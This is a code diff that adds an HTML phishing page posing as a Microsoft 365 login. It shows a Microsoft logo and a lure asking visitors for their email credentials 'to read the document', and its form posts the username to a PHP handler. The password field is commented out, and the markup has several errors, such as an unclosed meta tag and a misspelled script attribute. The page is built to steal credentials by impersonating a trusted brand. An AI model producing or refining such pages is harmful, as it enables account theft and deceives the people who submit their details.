@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8"
+    <script scr="script.js"></script>
+    <title>Login with Microsoft365</title>
+    <meta="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="/css/outlook.css">
+  </head>
+  <body>
+    <div align="center" style="margin-top: 100px">
+        <img src="/imgs/microsoft365.png" alt="Logo">
+        <h2>Login with your email address</h2>
+        <p>To read the document, please enter your valid email credentials that this file will be sent to.</p>
+        <form method="post" action="/PHP/main.php">
+        <label for="username">Email Address:</label>
+        <input type="text" id="username" name="username" required>
+        <br>
+        <!-- <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+        <br><br> -->
+        <a href="index.html" action="submit">
+        <input type="button" value="Submit" action="submit">
+        </a>
+        </form>
+    </div>
+  </body>
+  
+</html>
